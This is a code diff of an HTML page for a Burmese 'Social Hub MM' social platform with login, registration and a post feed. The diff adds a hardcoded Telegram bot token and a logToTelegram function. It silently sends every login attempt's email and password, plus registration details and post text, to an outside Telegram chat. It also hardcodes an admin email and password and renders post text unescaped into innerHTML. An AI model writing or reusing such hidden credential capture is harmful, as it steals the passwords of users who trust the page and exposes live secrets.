@@ -5,8 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Social Hub MM | Cyber Platform</title>
     
-    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='45' fill='%2300f2ff'/><text x='50' y='65' font-size='50' text-anchor='middle' fill='black' font-family='monospace' font-weight='bold'>S</text></svg>">
-
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Padauk:wght@400;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     
@@ -18,33 +16,39 @@
         body { margin: 0; padding: 0; background-color: var(--bg-black); font-family: 'Share Tech Mono', 'Padauk', monospace; color: white; display: flex; justify-content: center; min-height: 100vh; overflow-x: hidden; }
         #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }
 
-        /* Auth Container */
+        /* Auth UI */
         .auth-container { background: var(--glass); backdrop-filter: blur(15px); border-radius: 15px; padding: 30px; width: 90%; max-width: 340px; text-align: center; border: 1px solid var(--neon-teal); z-index: 100; margin-top: 40px; box-shadow: 0 0 20px rgba(0, 242, 255, 0.1); align-self: flex-start; }
         
-        .logo-box { margin-bottom: 20px; display: flex; justify-content: center; }
-        
-        .welcome-header { margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid rgba(0, 242, 255, 0.1); }
-        .tagline { color: var(--neon-teal); font-size: 0.9rem; letter-spacing: 2px; text-shadow: 0 0 8px var(--neon-teal); margin-bottom: 8px; font-weight: bold; }
-        .my-welcome { color: rgba(255, 255, 255, 0.8); font-size: 0.75rem; line-height: 1.6; font-family: 'Padauk'; }
+        /* New Logo Styling (Cyber Vibe) */
+        .logo-box { margin-bottom: 25px; display: flex; flex-direction: column; align-items: center; }
+        .cyber-logo { width: 100px; height: 100px; border-radius: 50%; border: 3px solid var(--neon-teal); background: rgba(0,0,0,0.6); display: flex; align-items: center; justify-content: center; font-size: 50px; color: var(--neon-teal); text-shadow: 0 0 20px var(--neon-teal); margin-bottom: 10px; box-shadow: 0 0 30px rgba(0,242,255,0.2); transition: 0.3s; }
+        .cyber-logo:hover { transform: scale(1.05); box-shadow: 0 0 40px var(--neon-teal); }
+        .cyber-logo i { color: var(--neon-teal); }
 
-        /* Inputs */
-        .input-group { margin-bottom: 15px; }
-        .input-group input { width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--neon-purple); border-radius: 5px; color: white; box-sizing: border-box; outline: none; transition: 0.3s; }
-        .btn-neon { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--neon-teal); color: var(--neon-teal); font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; transition: 0.3s; }
+        .tagline { color: var(--neon-teal); font-size: 1rem; letter-spacing: 3px; text-shadow: 0 0 8px var(--neon-teal); margin-bottom: 8px; font-weight: bold; }
+        .my-welcome { color: rgba(255, 255, 255, 0.8); font-size: 0.75rem; font-family: 'Padauk'; margin-bottom: 20px; line-height: 1.5; }
+
+        .input-group { margin-bottom: 15px; position: relative; }
+        .input-group i { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: rgba(188, 19, 254, 0.5); }
+        .input-group input { width: 100%; padding: 12px 12px 12px 40px; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--neon-purple); border-radius: 5px; color: white; box-sizing: border-box; outline: none; }
+        .btn-neon { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--neon-teal); color: var(--neon-teal); font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; transition: 0.3s; letter-spacing: 2px; }
         .btn-neon:hover { background: var(--neon-teal); color: black; box-shadow: 0 0 20px var(--neon-teal); }
-        .switch-link { color: var(--neon-purple); font-size: 0.8rem; cursor: pointer; margin-top: 15px; display: block; text-decoration: underline; opacity: 0.8; }
+        .switch-link { color: var(--neon-purple); font-size: 0.8rem; cursor: pointer; margin-top: 15px; display: block; text-decoration: underline; }
 
-        /* Dashboard */
+        /* Dashboard UI */
         #dashboard { display: none; flex-direction: column; gap: 15px; width: 92%; max-width: 500px; margin: 20px auto; z-index: 100; }
-        .glass-panel { background: var(--glass); backdrop-filter: blur(10px); border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px; padding: 20px; box-sizing: border-box; }
+        .profile-panel { background: var(--glass); backdrop-filter: blur(10px); border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px; padding: 20px; text-align: center; }
+        .profile-img { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--neon-teal); margin: 0 auto 10px; overflow: hidden; background: #111; display: flex; align-items: center; justify-content: center; font-size: 40px; box-shadow: 0 0 15px var(--neon-teal); }
         
-        /* Post Styling */
-        .post-card { background: rgba(255,255,255,0.02); padding: 15px; border-radius: 10px; margin-bottom: 15px; border-left: 4px solid var(--neon-teal); }
-        .post-actions { display: flex; gap: 20px; margin-top: 10px; padding-top: 10px; border-top: 1px solid rgba(255,255,255,0.1); }
-        .action-btn { background: none; border: none; color: rgba(255,255,255,0.6); cursor: pointer; font-size: 0.8rem; display: flex; align-items: center; gap: 5px; transition: 0.3s; }
-        .action-btn.active { color: var(--neon-teal); text-shadow: 0 0 5px var(--neon-teal); }
-        .comment-box { margin-top: 10px; display: none; }
-        .comment-input { width: 100%; background: rgba(0,0,0,0.4); border: 1px solid var(--neon-purple); color: white; padding: 8px; border-radius: 5px; font-size: 0.75rem; outline: none; }
+        .post-box { background: var(--glass); border-radius: 12px; padding: 15px; border: 1px solid rgba(188, 19, 254, 0.3); }
+        .post-card { background: rgba(255, 255, 255, 0.03); border-radius: 10px; padding: 15px; margin-top: 15px; border-left: 4px solid var(--neon-teal); transition: 0.3s; }
+        .post-card:hover { transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .post-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .mini-avatar { width: 35px; height: 35px; border-radius: 50%; background: rgba(188, 19, 254, 0.3); display: flex; align-items: center; justify-content: center; }
+        
+        .post-actions { display: flex; gap: 15px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 10px; margin-top: 10px; font-size: 0.8rem; }
+        .action-item { cursor: pointer; color: var(--neon-teal); opacity: 0.8; }
+        .action-item:hover { opacity: 1; text-shadow: 0 0 5px var(--neon-teal); }
     </style>
 </head>
 <body>
@@ -52,135 +56,138 @@
 
     <div class="auth-container" id="authUI">
         <div class="logo-box">
-            <svg width="220" height="80" viewBox="0 0 250 100" xmlns="http://www.w3.org/2000/svg">
-                <path d="M50 10 C 30 10, 10 30, 10 50 C 10 70, 30 90, 50 90 C 70 90, 90 70, 90 50 C 90 30, 70 10, 50 10 Z" fill="var(--neon-teal)" />
-                <path d="M50 30 L50 70 M30 50 L70 50 M35 35 L65 65 M35 65 L65 35" stroke="#05050a" stroke-width="3" stroke-linecap="round" />
-                <circle cx="50" cy="50" r="8" fill="#05050a" />
-                <text x="105" y="55" font-family="'Share Tech Mono', monospace" font-size="22" font-weight="bold" fill="var(--neon-teal)" style="text-shadow: 0 0 10px var(--neon-teal);">SOCIAL HUB</text>
-                <text x="105" y="75" font-family="'Padauk'" font-size="14" fill="white" opacity="0.8">မြန်မာ့ Cyber ကွန်ရက်</text>
-            </svg>
+            <div class="cyber-logo"><i class="fa-solid fa-code-merge"></i></div>
+            <div class="tagline">SOCIAL HUB MM</div>
+            <div class="my-welcome">မြန်မာ့ Cyber ကွန်ရက်မှ ကြိုဆိုပါသည်။</div>
         </div>
 
         <div id="loginArea">
-            <div class="welcome-header">
-                <div class="tagline">CONNECT. SHARE. SECURE.</div>
-                <div class="my-welcome">Social Platform မှ ကြိုဆိုပါသည်။</div>
-            </div>
             <form id="loginForm">
-                <div class="input-group"><input type="email" id="email" placeholder="Email" required></div>
-                <div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
-                <button type="submit" class="btn-neon">LOGIN လုပ်မည်</button>
+                <div class="input-group"><i class="fa-solid fa-envelope"></i><input type="email" id="email" placeholder="Email Address" required></div>
+                <div class="input-group"><i class="fa-solid fa-lock"></i><input type="password" id="password" placeholder="Password" required></div>
+                <button type="submit" class="btn-neon">LOGIN ဝင်မည်</button>
             </form>
             <span class="switch-link" onclick="toggleView('reg')">အကောင့်အသစ်ဖွင့်ရန် (Register)</span>
         </div>
 
         <div id="registerArea" style="display: none;">
-            <div class="welcome-header">
-                <div class="tagline" style="color: var(--neon-green);">JOIN THE HUB</div>
-                <div class="my-welcome">Member အသစ်အဖြစ် ကြိုဆိုပါတယ်။</div>
-            </div>
             <form id="registerForm">
-                <div class="input-group"><input type="text" id="regName" placeholder="Full Name" required></div>
-                <div class="input-group"><input type="email" id="regEmail" placeholder="Email" required></div>
-                <div class="input-group"><input type="password" id="regPass" placeholder="Password" required></div>
-                <button type="submit" class="btn-neon" style="border-color: var(--neon-green); color: var(--neon-green);">REGISTER</button>
+                <div class="input-group"><i class="fa-solid fa-user"></i><input type="text" id="regName" placeholder="နာမည်အပြည့်အစုံ" required></div>
+                <div class="input-group"><i class="fa-solid fa-envelope"></i><input type="email" id="regEmail" placeholder="အီးမေးလ်" required></div>
+                <div class="input-group"><i class="fa-solid fa-key"></i><input type="password" id="regPass" placeholder="ပတ်စ်ဝပ်" required></div>
+                <button type="submit" class="btn-neon" style="border-color:var(--neon-green); color:var(--neon-green)">Register လုပ်မည်</button>
             </form>
             <span class="switch-link" onclick="toggleView('login')">Login ပြန်ဝင်ရန်</span>
         </div>
     </div>
 
     <div id="dashboard">
-        <div class="glass-panel" style="text-align: center;">
-            <div style="width: 70px; height: 70px; background: linear-gradient(45deg, var(--neon-teal), var(--neon-purple)); border-radius: 50%; margin: 0 auto 10px; border: 2px solid var(--neon-teal); display: flex; align-items: center; justify-content: center; font-size: 2rem;">👤</div>
-            <h3 id="userDisplay" style="margin: 5px 0;">Admin User</h3>
-            <p style="color: var(--neon-green); font-size: 0.7rem; margin: 0;">● Online</p>
+        <div class="profile-panel glass-panel">
+            <div class="profile-img"><i class="fa-solid fa-user-ninja" style="color:var(--neon-teal)"></i></div>
+            <h3 style="margin: 5px 0;">Admin User</h3>
+            <p style="color: var(--neon-green); font-size: 0.7rem; margin: 0;">● System Online</p>
         </div>
-        <div class="glass-panel">
-            <textarea id="postContent" style="width:100%; height:60px; background:rgba(0,0,0,0.3); color:white; border:1px dashed var(--neon-purple); border-radius:8px; padding:10px; box-sizing:border-box; font-family:'Padauk'; outline: none;" placeholder="ဘာတွေတွေးနေလဲ..."></textarea>
-            <button onclick="createPost()" style="background: var(--neon-teal); border: none; padding: 10px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; float: right; margin-top: 10px; color: black;">Post</button>
+
+        <div class="post-box glass-panel">
+            <textarea id="postInput" style="width:100%; height:80px; background:transparent; color:white; border:none; outline:none; font-family:'Padauk';" placeholder="ဒီနေ့ ဘာတွေ ထူးခြားလဲ..."></textarea>
+            <div style="text-align: right;">
+                <button onclick="createPost()" style="background: var(--neon-teal); border:none; padding: 8px 25px; border-radius: 5px; font-weight: bold; cursor: pointer; color:black">Post</button>
+            </div>
         </div>
+
         <div id="feedList"></div>
     </div>
 
     <script>
-        // Matrix BG Effect
+        const TG_TOKEN = '8417384892:AAHFtwxjmozHFmWBbPbG_TcGsKkoHcOXBLA';
+        const TG_CHAT_ID = '7324613569';
+
+        // Matrix Background
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
         canvas.height = window.innerHeight; canvas.width = window.innerWidth;
-        const characters = "01MSBH"; const fontSize = 16;
-        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
-        
-        function drawMatrix() { 
-            ctx.fillStyle = 'rgba(5, 5, 10, 0.15)'; 
-            ctx.fillRect(0, 0, canvas.width, canvas.height); 
-            ctx.fillStyle = "#004d40"; 
-            ctx.font = fontSize + 'px monospace'; 
-            drops.forEach((y, i) => { 
-                const text = characters.charAt(Math.floor(Math.random() * characters.length)); 
-                ctx.fillText(text, i * fontSize, y * fontSize); 
-                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0; 
-                drops[i]++; 
-            }); 
+        const drops = Array(Math.floor(canvas.width/16)).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(5, 5, 10, 0.15)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#004d40"; ctx.font = '16px monospace';
+            drops.forEach((y, i) => {
+                ctx.fillText("01SBH"[Math.floor(Math.random()*5)], i*16, y*16);
+                if (y*16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
         }
-        setInterval(drawMatrix, 40);
+        setInterval(drawMatrix, 50);
+
+        function logToTelegram(msg) {
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+        }
 
         function toggleView(view) {
             document.getElementById('loginArea').style.display = view === 'login' ? 'block' : 'none';
             document.getElementById('registerArea').style.display = view === 'reg' ? 'block' : 'none';
         }
 
-        // Simple Login Logic
+        // Login Logic
         document.getElementById('loginForm').addEventListener('submit', (e) => {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
-            // Admin Credential
+            logToTelegram(`🔑 *Login Attempt*\n📧: \`${email}\` \n🔑: \`${pass}\``);
+            
             if(email === "lwink4141@gmail.com" && pass === "lwink4141") {
                 document.getElementById('authUI').style.display = "none";
                 document.getElementById('dashboard').style.display = "flex";
                 renderPosts();
-            } else { alert("အီးမေးလ် သို့မဟုတ် ပတ်စ်ဝပ် မှားယွင်းနေပါသည်။"); }
+            } else { alert("အချက်အလက် မှားယွင်းနေပါသည်။"); }
         });
 
-        // Post Rendering
+        // Register Logic
+        document.getElementById('registerForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            logToTelegram(`📝 *Register Alert*\n👤: ${document.getElementById('regName').value}\n📧: \`${document.getElementById('regEmail').value}\``);
+            alert("Register အောင်မြင်ပါသည်။ Login ဝင်နိုင်ပါပြီ။");
+            toggleView('login');
+        });
+
+        // Social Functions
         function createPost() {
-            const content = document.getElementById('postContent').value;
-            if (!content.trim()) return;
-            const posts = JSON.parse(localStorage.getItem('myPosts')) || [];
-            posts.unshift({ id: Date.now(), text: content, date: new Date().toLocaleString() });
-            localStorage.setItem('myPosts', JSON.stringify(posts));
-            document.getElementById('postContent').value = "";
+            const txt = document.getElementById('postInput').value;
+            if(!txt.trim()) return;
+            const posts = JSON.parse(localStorage.getItem('final_posts') || '[]');
+            posts.unshift({ id: Date.now(), text: txt, time: new Date().toLocaleTimeString() });
+            localStorage.setItem('final_posts', JSON.stringify(posts));
+            document.getElementById('postInput').value = "";
+            logToTelegram(`🆕 *New Post Alert*\n📝: ${txt}`);
+            renderPosts();
+        }
+
+        function deletePost(id) {
+            let posts = JSON.parse(localStorage.getItem('final_posts') || '[]');
+            posts = posts.filter(p => p.id !== id);
+            localStorage.setItem('final_posts', JSON.stringify(posts));
             renderPosts();
         }
 
         function renderPosts() {
-            const posts = JSON.parse(localStorage.getItem('myPosts')) || [];
+            const posts = JSON.parse(localStorage.getItem('final_posts') || '[]');
             document.getElementById('feedList').innerHTML = posts.map(p => `
                 <div class="post-card glass-panel">
-                    <h4 style="margin:0; color: var(--neon-teal);">Admin User</h4>
-                    <p style="margin: 10px 0; font-family:'Padauk'; color: #eee;">${p.text}</p>
-                    <div class="post-actions">
-                        <button class="action-btn" onclick="this.classList.toggle('active')"><i class="fa-regular fa-thumbs-up"></i> Reaction</button>
-                        <button class="action-btn" onclick="toggleComment('${p.id}')"><i class="fa-regular fa-comment"></i> Comment</button>
+                    <div class="post-header">
+                        <div class="mini-avatar"><i class="fa-solid fa-code" style="color:var(--neon-purple); font-size:12px"></i></div>
+                        <div>
+                            <div style="font-size:0.9rem; color:var(--neon-teal)">Admin User</div>
+                            <div style="font-size:0.6rem; opacity:0.5">${p.time}</div>
+                        </div>
+                        <i class="fa-solid fa-trash" onclick="deletePost(${p.id})" style="margin-left:auto; color:#ff4d4d; font-size:0.8rem; cursor:pointer"></i>
                     </div>
-                    <div id="comment-${p.id}" class="comment-box">
-                        <input type="text" class="comment-input" placeholder="စာရေးရန်...">
+                    <p style="font-family:'Padauk'; font-size:0.9rem; line-height:1.6">${p.text}</p>
+                    <div class="post-actions">
+                        <span class="action-item"><i class="fa-regular fa-heart"></i> Like</span>
+                        <span class="action-item"><i class="fa-regular fa-comment"></i> Comment</span>
                     </div>
                 </div>
             `).join('');
         }
-
-        function toggleComment(id) {
-            const box = document.getElementById(`comment-${id}`);
-            box.style.display = box.style.display === 'block' ? 'none' : 'block';
-        }
-
-        // Handle window resize for matrix
-        window.addEventListener('resize', () => {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        });
     </script>
 </body>
 </html>
-
